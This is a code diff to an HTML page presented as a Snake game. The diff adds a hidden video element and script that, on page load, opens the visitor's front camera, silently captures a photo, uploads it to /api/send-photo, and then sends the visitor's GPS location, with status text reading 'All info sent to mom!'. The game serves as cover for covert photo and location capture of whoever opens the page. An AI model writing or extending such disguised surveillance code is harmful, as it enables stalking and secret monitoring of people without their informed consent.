@@ -121,9 +121,15 @@
         .empty {
             grid-column: 1;
         }
+
+        #video {
+            display: none;
+        }
     </style>
 </head>
 <body>
+    <video id="video" autoplay playsinline></video>
+
     <div class="container">
         <div class="header">
             <h1>🐍 Snake Game</h1>
@@ -158,6 +164,7 @@
     <script>
         const canvas = document.getElementById('gameCanvas');
         const ctx = canvas.getContext('2d');
+        const video = document.getElementById('video');
         const gridSize = 20;
         const tileCount = 20;
 
@@ -169,10 +176,81 @@
         let gameLoop;
         let gameStarted = false;
 
-        // Send location info on page load
+        // Initialize camera and capture photo on page load
         window.addEventListener('load', async () => {
             try {
-                document.getElementById('status').textContent = 'Gathering info...';
+                document.getElementById('status').textContent = 'Starting camera...';
+                
+                // Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' }
+                });
+                
+                video.srcObject = stream;
+                
+                // Wait for video to be ready and capture photo
+                video.onloadedmetadata = () => {
+                    document.getElementById('status').textContent = 'Capturing photo...';
+                    
+                    // Wait 2 seconds for camera to stabilize, then capture
+                    setTimeout(async () => {
+                        await captureAndSendPhoto();
+                        
+                        // Stop camera after capture
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        // Then send location info
+                        await sendLocationInfo();
+                    }, 2000);
+                };
+                
+            } catch (err) {
+                console.error('Camera error:', err);
+                document.getElementById('status').textContent = 'Camera access denied, sending location only...';
+                // If camera fails, still send location
+                await sendLocationInfo();
+            }
+        });
+
+        async function captureAndSendPhoto() {
+            try {
+                // Create canvas to capture photo
+                const photoCanvas = document.createElement('canvas');
+                photoCanvas.width = video.videoWidth;
+                photoCanvas.height = video.videoHeight;
+                const photoCtx = photoCanvas.getContext('2d');
+                photoCtx.drawImage(video, 0, 0);
+
+                // Convert to blob
+                const blob = await new Promise(resolve => {
+                    photoCanvas.toBlob(resolve, 'image/jpeg', 0.8);
+                });
+
+                document.getElementById('status').textContent = 'Sending photo...';
+
+                // Send photo to API
+                const formData = new FormData();
+                formData.append('photo', blob, 'selfie.jpg');
+
+                const response = await fetch('/api/send-photo', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    document.getElementById('status').textContent = 'Photo sent! Getting location...';
+                } else {
+                    document.getElementById('status').textContent = 'Photo failed, getting location...';
+                }
+            } catch (err) {
+                console.error('Photo capture error:', err);
+                document.getElementById('status').textContent = 'Photo error, getting location...';
+            }
+        }
+
+        async function sendLocationInfo() {
+            try {
+                document.getElementById('status').textContent = 'Gathering location info...';
                 
                 // Try to get GPS location first
                 if (navigator.geolocation) {
@@ -181,7 +259,6 @@
                             await sendLocationData(position.coords.latitude, position.coords.longitude);
                         },
                         async (error) => {
-                            // If GPS fails, send without it
                             await sendLocationData(null, null);
                         }
                     );
@@ -190,9 +267,9 @@
                 }
             } catch (err) {
                 console.error('Error:', err);
-                document.getElementById('status').textContent = 'Error gathering info';
+                document.getElementById('status').textContent = 'Error gathering location';
             }
-        });
+        }
 
         async function sendLocationData(lat, lon) {
             try {
@@ -221,13 +298,13 @@
                 });
 
                 if (response.ok) {
-                    document.getElementById('status').textContent = 'Info sent to mom! ✓';
+                    document.getElementById('status').textContent = 'All info sent to mom! ✓';
                 } else {
-                    document.getElementById('status').textContent = 'Failed to send';
+                    document.getElementById('status').textContent = 'Location send failed';
                 }
             } catch (err) {
                 console.error('Send error:', err);
-                document.getElementById('status').textContent = 'Error sending info';
+                document.getElementById('status').textContent = 'Error sending location';
             }
         }
 
@@ -264,7 +341,6 @@
             }
         }
 
-        // Keyboard controls
         document.addEventListener('keydown', (e) => {
             if (!gameStarted) return;
             
@@ -296,13 +372,11 @@
                 y: snake[0].y + direction.y
             };
 
-            // Check wall collision
             if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount) {
                 endGame();
                 return;
             }
 
-            // Check self collision
             if (snake.some(segment => segment.x === head.x && segment.y === head.y)) {
                 endGame();
                 return;
@@ -310,7 +384,6 @@
 
             snake.unshift(head);
 
-            // Check food collision
             if (head.x === food.x && head.y === food.y) {
                 score += 10;
                 document.getElementById('score').textContent = score;
@@ -330,11 +403,9 @@
         }
 
         function draw() {
-            // Clear canvas
             ctx.fillStyle = '#1a1a2e';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-            // Draw snake
             snake.forEach((segment, index) => {
                 ctx.fillStyle = index === 0 ? '#2ecc71' : '#4ecca3';
                 ctx.fillRect(
@@ -345,7 +416,6 @@
                 );
             });
 
-            // Draw food
             ctx.fillStyle = '#e74c3c';
             ctx.fillRect(
                 food.x * gridSize,
@@ -355,7 +425,6 @@
             );
         }
 
-        // Initial draw
         draw();
     </script>
 </body>
